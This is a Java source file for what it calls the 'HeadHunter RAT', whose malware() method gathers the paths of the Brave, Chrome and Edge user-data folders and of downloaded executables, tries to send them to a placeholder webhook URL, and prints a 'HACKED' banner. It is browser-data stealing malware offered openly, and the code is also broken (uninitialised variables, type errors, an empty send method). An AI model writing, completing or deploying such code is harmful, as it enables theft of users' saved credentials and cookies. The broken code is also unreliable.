import java.io.File;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.Proxy;
import java.net.URL;
import java.net.URLConnection;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.Arrays;

public class HeadHunter {
    File file;

    public File getFile() {
        return file;
    }

    void malware(String url) {
        char filename;
        ArrayList<String> files = new ArrayList<String>();
        String brave_data = (System.getenv("LOCALAPPDATA") + "/BraveSoftware/Brave-Browser/User Data");
        String chrome_data = (System.getenv("LOCALAPPDATA") + "/Google/Chrome/user Data");
        String edge_data = (System.getenv("LOCALAPPDATA") + "/Microsoft/Edge/User Data");
        String jarfile = (System.getenv("DOWNLOADS") + filename + ".jar");
        String exefile = (System.getenv("DOWNLOADS") + filename + ".exe");
        files.add(brave_data);
        files.add(chrome_data);
        files.add(edge_data);
        files.add(jarfile);
        files.add(exefile);
        if (files.add(brave_data) ||
                files.add(chrome_data) || files.add(edge_data)
                || files.add(jarfile) || files.add(exefile)) {
            try {
                HttpURLConnection webhook = (HttpURLConnection) new URL("webhook here").openConnection();
                try {
                    webhook.getOutputStream().write(files.get(exefile));
                } catch (IOException e2) {
                }
            } catch (IOException e1) {
                e1.printStackTrace();
            }
            try {
                Runtime.getRuntime().exec("Chrome.exe");
                Runtime.getRuntime().exec("Brave Browser.exe");
                Runtime.getRuntime().exec("cmd.exe /c echo HACKED BY HeadHunter RAT!");
            } catch (IOException e) {
                e.printStackTrace();
            }
            try {
                InetAddress.getLocalHost().getHostAddress();
            } catch (UnknownHostException e) {
                e.printStackTrace();
            }
        }

    }

    public void send(File file, URL url) {
    }

}